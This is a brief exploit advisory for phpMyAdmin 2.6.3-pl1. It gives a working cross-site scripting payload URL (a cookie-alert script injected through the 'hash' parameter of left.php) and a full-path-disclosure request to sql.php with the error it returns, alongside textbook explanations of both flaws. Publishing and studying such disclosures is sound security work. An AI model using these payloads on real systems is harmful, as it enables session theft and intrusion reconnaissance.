@@ -1,0 +1,41 @@
+# Exploit Title: phpMyAdmin 2.6.3-pl1 Cross Site Scripting and Full Path
+Disclosure.
+# Date: 20/04/10
+# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com | www.DigitalWhisper.co.il
+# Software Link: www.phpmyadmin.net |
+http://www.phpmyadmin.net/home_page/downloads.php
+# Version: 2.6.3-pl1
+# Tested on: PHP
+#
+##[Cross Site Scripting]*
+(Cross-Site Scripting attacks are a type of injection problem, in which
+malicious scripts are injected into the otherwise benign and trusted web
+sites. Cross-site scripting (XSS) attacks occur when an attacker uses a web
+application to send malicious code, generally in the form of a browser side
+script, to a different end user. Flaws that allow these attacks to succeed
+are quite widespread and occur anywhere a web application uses input from a
+user in the output it generates without validating or encoding it)
+http://
+[server]/phpmyadmin/left.php?lang=he-iso-8859-8-i&server=1&hash=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+#
+#
+##[FULL PATH DICSLOSURE]**
+(Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the
+path to the webroot/file. e.g.: /home/omg/htdocs/file/. Certain
+vulnerabilities, such as using the load_file() (within a SQL Injection)
+query to view the page source, require the attacker to have the full path to
+the file they wish to view. (OWASP))
+#
+http://
+[server]/phpmyadmin/sql.php?lang=he-iso-8859-8-i&server=1&db=x&table=x&sql_query=1'
+#
+Will returne:
+#
+Fatal error: Cannot use string offset as an array in [FPD] on line 901
+#
+#
+*The victim must be logged in.
+**The attacker must be logged in.
+#
+#
+[e0f]
